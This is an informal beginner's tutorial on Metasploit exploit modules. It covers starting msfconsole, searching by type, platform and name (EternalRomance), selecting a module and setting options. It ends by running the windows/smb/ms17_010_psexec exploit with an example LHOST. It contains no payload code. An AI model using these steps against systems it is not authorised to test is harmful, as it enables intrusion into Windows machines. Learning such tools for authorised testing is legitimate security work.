Metasploit:Exploits module

To use metaspoite we can manually start it or we can write “msfconsole” in the terminal.
->usually metasploit directory will be found in /usr/share/metasploit-framework

-> Linux command can be use in msf terminal
->we can use help to get manual of metasploit in msf terminal
->we can search by using “search” keyword following search term
　　example: search  exploits
　　which will be used to find all the exploits in metasploit


#1.How to find specific exploits for specific  vulnernabllity?

->we can use nmap to enumeratation of the target such as os,services,ports etc.

then we can use the following command in msf terminal.

->”search type:exploit platform:windows name:eternalromance”

where exploits is the module name(metasploit has 7 modules like exploit,auxiliary,encoders,evasion,post,payload,nops etc),eternalromance is the exploit name.

2.How to use specific  exploits in metasploit?


->we can use “use” key word to use a specific exploits following by the exploits name or directory or number of the exploits.

example:use 4136

->we can check which options are required to run that exploits by using “options” key word after the exploit number is set or when we in exploit directory.

example :msf6 exploit(windows/smb/ms17_010_psexec) > show 

->we need to set options which is required yes.

->we can use “set” key word to set the required options following by options_name and options value.

example: msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 10.10.10.14

->after setting the all required value we can run the exploits using “run” command.

example:msf6 exploit(windows/smb/ms17_010_psexec) > run
